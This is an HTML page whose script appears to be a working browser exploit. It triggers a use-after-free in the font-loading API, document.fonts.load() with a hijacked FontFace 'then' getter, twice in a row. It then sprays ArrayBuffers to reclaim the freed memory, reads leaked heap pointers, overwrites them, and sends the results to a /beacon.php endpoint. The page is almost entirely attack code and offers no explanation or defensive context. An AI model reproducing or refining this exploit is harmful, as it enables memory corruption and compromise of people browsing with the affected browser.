<!DOCTYPE html><html><head><meta charset="utf-8"><title>p1104v2</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a0f;color:#c8ffc8;font:12px/1.5 monospace;padding:12px;min-height:100vh}#log{white-space:pre-wrap;word-break:break-all}.hit{color:#ff6;font-weight:bold}.ptr{color:#f6f;font-weight:bold}.fail{color:#f66}.ok{color:#6f6}.info{color:#6cf}.crit{color:#f00;font-weight:bold;font-size:13px}.win{color:#0f0;font-weight:bold;font-size:14px}.phase{color:#fff;font-size:13px;font-weight:bold;margin:6px 0}</style>
</head><body>
<div id="log"></div>
<script>
var L=document.getElementById('log');
function log(c,m){var d=document.createElement('div');d.className=c;d.textContent=m;L.appendChild(d);L.scrollTop=L.scrollHeight;}
function B(t,d){try{new Image().src='/beacon.php?tag='+encodeURIComponent(t)+'&data='+encodeURIComponent(d||'')+'&_='+Math.random();}catch(e){}}
function hex(v){return'0x'+v.toString(16);}

B('P1104v2-BOOT','');
log('phase','P1104v2: DUAL UAF via proven fonts.load() + clear() reset');

var SIZES=[64,96,128,160,192,224,256,320,384,512,768,1024,2048];
var K=8;

// ============================================================
// UAF #1: Exact proven pattern
// ============================================================
var st1=document.createElement('style');
st1.textContent="@font-face{font-family:s0;src:local(Arial);unicode-range:U+0042;}";
document.head.appendChild(st1);
var f0=new FontFace('f0','local(Helvetica)',{unicodeRange:'U+0041'});
document.fonts.add(f0);void f0.loaded;

var fired1=false,map1=null,buf1=null,ptrs1=null,idx1=-1,patched1=false;
Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
  if(fired1)return undefined;fired1=true;
  if(st1){st1.remove();st1=null;}
  try{document.fonts.delete(this);}catch(e){}
  document.body.offsetHeight;
  map1=[];
  for(var si=0;si<SIZES.length;si++){
    var sz=SIZES[si];
    for(var k=0;k<K;k++){map1.push({size:sz,ab:new ArrayBuffer(sz),idx:si*K+k});}
  }
  try{document.fonts.check('1em s0');}catch(e){}
  return undefined;
},set:function(){}});
document.fonts.load('1em f0, s0','AB').then(function(){},function(){});

// Poll UAF1
for(var t=15;t<=200;t+=5){(function(ms){setTimeout(function(){
  if(patched1||!map1)return;
  for(var bi=32;bi<40;bi++){
    if(!map1[bi])continue;
    var b=new BigUint64Array(map1[bi].ab);
    var nz=0;for(var q=0;q<b.length;q++)if(b[q]!==0n)nz++;
    if(nz>0&&!patched1){
      patched1=true;buf1=b;idx1=bi;
      ptrs1=[];
      for(var q=0;q<b.length;q++)if(b[q]!==0n)ptrs1.push({off:q*8,val:b[q]});
      b[0]=0x100n;
      B('P1104v2-UAF1','buf='+bi+'|ms='+ms+'|'+ptrs1.map(function(p){return'+'+hex(p.off)+'='+hex(p.val);}).join(','));
    }
  }
},ms);})(t);}

// ============================================================
// UAF #2: SAME proven trigger, fresh font set via clear()
// Key: fonts.clear() resets the set, then we build fresh s2/f2
// and use fonts.load() again — the EXACT same trigger path
// ============================================================
setTimeout(function(){
  if(!patched1){B('P1104v2-NOHIT1','');return;}
  log('ok','UAF1 OK: buf#'+idx1);
  log('ptr','  '+ptrs1.map(function(p){return hex(p.off)+'='+hex(p.val);}).join(', '));

  var ptr1_58=0n,ptr1_68=0n;
  for(var i=0;i<ptrs1.length;i++){
    if(ptrs1[i].off===0x58)ptr1_58=ptrs1[i].val;
    if(ptrs1[i].off===0x68)ptr1_68=ptrs1[i].val;
  }

  log('phase','UAF #2: clear() + fresh fonts.load()...');

  // Clear the font set completely
  try{document.fonts.clear();}catch(e){}

  // Create fresh CSS @font-face + JS FontFace
  var st2=document.createElement('style');
  st2.textContent="@font-face{font-family:s2;src:local(Courier);unicode-range:U+0043;}";
  document.head.appendChild(st2);
  var f2=new FontFace('f2','local(Times)',{unicodeRange:'U+0044'});
  document.fonts.add(f2);void f2.loaded;

  var fired2=false,map2=null,buf2=null,ptrs2=null,idx2=-1,patched2=false;

  // Redefine .then getter for UAF2
  Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
    if(fired2)return undefined;fired2=true;
    B('P1104v2-FIRE2','getter fired');
    // Delete s2 CSS font — same pattern as UAF1
    if(st2){st2.remove();st2=null;}
    try{document.fonts.delete(this);}catch(e){}
    document.body.offsetHeight;

    // Spray — 16 buffers per size for wider coverage
    map2=[];
    for(var si=0;si<SIZES.length;si++){
      var sz=SIZES[si];
      for(var k=0;k<16;k++){map2.push({size:sz,ab:new ArrayBuffer(sz),idx:si*16+k});}
    }
    try{document.fonts.check('1em s2');}catch(e){}
    return undefined;
  },set:function(){}});

  // Fire the SAME proven trigger
  document.fonts.load('1em f2, s2','CD').then(function(){},function(){});

  // Poll UAF2 — scan 192-byte buffers (indices 64..79 now, since K=16)
  var lo2=4*16,hi2=4*16+16; // size index 4 = 192, times K=16
  for(var t2=15;t2<=400;t2+=5){(function(ms){setTimeout(function(){
    if(patched2||!map2)return;
    for(var bi=lo2;bi<hi2;bi++){
      if(!map2[bi])continue;
      var b=new BigUint64Array(map2[bi].ab);
      var nz=0;for(var q=0;q<b.length;q++)if(b[q]!==0n)nz++;
      if(nz>0&&!patched2){
        patched2=true;buf2=b;idx2=bi;
        ptrs2=[];
        for(var q=0;q<b.length;q++)if(b[q]!==0n)ptrs2.push({off:q*8,val:b[q]});
        b[0]=0x100n;
        B('P1104v2-UAF2','buf='+bi+'|ms='+ms+'|'+ptrs2.map(function(p){return'+'+hex(p.off)+'='+hex(p.val);}).join(','));
      }
    }
    // Also scan ALL buffers in case different size reclaimed
    if(!patched2){
      for(var bi=0;bi<map2.length;bi++){
        if(bi>=lo2&&bi<hi2)continue;
        if(!map2[bi]||map2[bi].size<128||map2[bi].size>256)continue;
        var b=new BigUint64Array(map2[bi].ab);
        var nz=0;for(var q=0;q<b.length;q++)if(b[q]!==0n)nz++;
        if(nz>0&&!patched2){
          patched2=true;buf2=b;idx2=bi;
          ptrs2=[];
          for(var q=0;q<b.length;q++)if(b[q]!==0n)ptrs2.push({off:q*8,val:b[q]});
          b[0]=0x100n;
          B('P1104v2-UAF2-ALT','buf='+bi+'|sz='+map2[bi].size+'|ms='+ms+'|'+ptrs2.map(function(p){return'+'+hex(p.off)+'='+hex(p.val);}).join(','));
        }
      }
    }
  },ms);})(t2);}

  // Final analysis
  setTimeout(function(){
    B('P1104v2-F2STATUS','fired='+fired2+'|patched='+patched2);
    if(!patched2){
      log('fail','UAF2: getter fired='+fired2+', reclaim=false');
      B('P1104v2-DONE','uaf1=ok|uaf2=fail|fired2='+fired2);

      // Diagnostic: scan ALL map2 buffers for any non-zero
      if(map2){
        var anyNZ=0;
        for(var bi=0;bi<map2.length;bi++){
          var u=new Uint8Array(map2[bi].ab);
          for(var j=0;j<u.length;j++){if(u[j]!==0){anyNZ++;break;}}
        }
        B('P1104v2-DIAG','totalBufs='+map2.length+'|anyNonZero='+anyNZ);
        log('info','Diagnostic: '+map2.length+' buffers, '+anyNZ+' non-zero');
      }
      return;
    }

    log('','');
    log('win','DUAL UAF!');
    log('ok','UAF1: buf#'+idx1+' | UAF2: buf#'+idx2);
    log('ptr','UAF1: '+ptrs1.map(function(p){return hex(p.off)+'='+hex(p.val);}).join(', '));
    log('ptr','UAF2: '+ptrs2.map(function(p){return hex(p.off)+'='+hex(p.val);}).join(', '));

    var ptr2_58=0n,ptr2_68=0n;
    for(var i=0;i<ptrs2.length;i++){
      if(ptrs2[i].off===0x58)ptr2_58=ptrs2[i].val;
      if(ptrs2[i].off===0x68)ptr2_68=ptrs2[i].val;
    }
    if(ptr1_58!==0n&&ptr2_58!==0n){
      var d=ptr2_58>ptr1_58?ptr2_58-ptr1_58:ptr1_58-ptr2_58;
      log('ptr','Delta58: '+hex(d)+' ('+(ptr2_58>ptr1_58?'+':'-')+')');
    }
    if(ptr1_68!==0n&&ptr2_68!==0n){
      var d=ptr2_68>ptr1_68?ptr2_68-ptr1_68:ptr1_68-ptr2_68;
      log('ptr','Delta68: '+hex(d)+' ('+(ptr2_68>ptr1_68?'+':'-')+')');
    }

    // Independence test
    var m1=0xAAAA1111BBBB2222n,m2=0xCCCC3333DDDD4444n;
    buf1[1]=m1;buf2[1]=m2;
    var overlap=buf1[1]===m2||buf2[1]===m1;
    log('info','Independent: '+(!overlap?'YES':'OVERLAP!'));
    buf1[1]=0n;buf2[1]=0n;

    var s='uaf1='+idx1+'|uaf2='+idx2+'|overlap='+overlap;
    s+='|p1_58='+hex(ptr1_58)+'|p1_68='+hex(ptr1_68);
    s+='|p2_58='+hex(ptr2_58)+'|p2_68='+hex(ptr2_68);
    B('P1104v2-DUAL',s);
    B('P1104v2-DONE','dual=true|overlap='+overlap);
  },2000);
},600);
</script>
</body></html>
